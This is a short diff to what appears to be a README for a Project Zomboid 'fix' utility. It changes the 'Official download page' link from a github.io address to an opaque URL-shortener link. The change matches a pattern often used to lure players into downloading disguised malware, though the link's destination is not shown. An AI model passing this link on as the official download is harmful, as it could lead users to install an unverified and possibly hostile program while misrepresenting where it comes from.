@@ -9,4 +9,4 @@ If Project Zomboid still has issues after applying the utility:
 5. Re-run the tool and scan again
 
 Official download page:
-https://idleobstacle.github.io/
+https://flyn.co/17yeN7/
